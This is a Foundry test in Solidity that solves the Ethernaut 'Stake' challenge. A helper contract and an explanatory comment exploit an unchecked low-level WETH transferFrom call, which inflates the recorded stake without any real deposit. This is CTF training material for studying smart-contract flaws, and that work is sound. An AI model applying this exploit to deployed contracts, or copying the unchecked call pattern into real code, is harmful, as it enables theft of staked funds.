// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {console, Test} from "forge-std/Test.sol";
import {Stake} from "../../src/31/Stake.sol";
import {HelperConfig} from "../../script/HelperConfig.s.sol";
import {StakeFactory} from "src/31/StakeFactory.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {BaseTest} from "../BaseTest.sol";
import {Vm} from "forge-std/Vm.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract StakeTest is Test, BaseTest {
    Stake public instanceContract;

    constructor() {
        // SETUP LEVEL FACTORY
        levelFactory = address(new StakeFactory());
        vm.deal(player, 1 ether);
    }

    function setUp() public override {
        super.setUp();
        config = new HelperConfig(levelFactory);
        (ethernaut, instance,) = config.activeNetworkConfig();

        instanceContract = Stake(instance);
    }

    function testRunLevel() public {
        runLevel();
    }

    function exploitLevel() internal override {
        vm.startPrank(player, player);

        // The player's stake needs to be 0, so we will use a contract to stake a little bit of eth. Then we will unstake a little bit less than the total eth balance of the contract.
        Exploit exploit = new Exploit(instanceContract);
        uint256 minAmountToStake = 0.001 ether + 1;
        exploit.stakeETH{value: minAmountToStake + 1}();

        // The call (bool transfered, ) = WETH.call(abi.encodeWithSelector(0x23b872dd, msg.sender,address(this),amount)); is not checked if it was well executed. The execution of StakeWETH will work and increase our stake even if we didnt deposit anything. This will increase totalStaked without increasing the eth balance of the contract. We then unstake everything so that the player's stake == 0 while totalStaked > eth balance. We stake a little bit less than the total eth balance so that eth balance > 0 at the end.
        IERC20(instanceContract.WETH()).approve(address(instanceContract), type(uint256).max);
        instanceContract.StakeWETH(minAmountToStake);
        instanceContract.Unstake(minAmountToStake);

        // DONE !

        vm.stopPrank();
    }
}

contract Exploit {
    address internal immutable owner;
    Stake internal immutable stake;

    constructor(Stake _stake) {
        owner = msg.sender;
        stake = _stake;
    }

    function stakeETH() external payable {
        require(msg.sender == owner);
        // msg.value is preserved in this call
        // @note this call creates a new context and transfers msg.value into stake
        // If this function is called again with msg.value it will revert because it will try to send eth again and will fail.
        stake.StakeETH{value: msg.value}();
    }
}
